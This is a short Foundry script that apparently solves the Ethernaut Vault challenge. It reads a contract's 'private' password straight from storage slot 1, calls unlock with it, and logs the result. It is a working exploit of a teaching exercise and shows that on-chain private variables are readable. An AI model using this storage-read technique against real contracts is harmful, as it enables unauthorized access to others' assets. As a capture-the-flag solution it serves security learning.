// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Vault.sol";

contract ForceScript is Script {
    
    address instance = 0x919119E8eB67056D58E78A64b09f688853F8E326;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // read the storage slot that contains the private variable `password`, since it is in the second slot, we use uint256(1) to access it
        bytes32 password = vm.load(instance, bytes32(uint256(1)));
        console.logBytes32(password);
        Vault(instance).unlock(password);
        console.logBool(Vault(instance).locked());
        vm.stopBroadcast();
    }
}
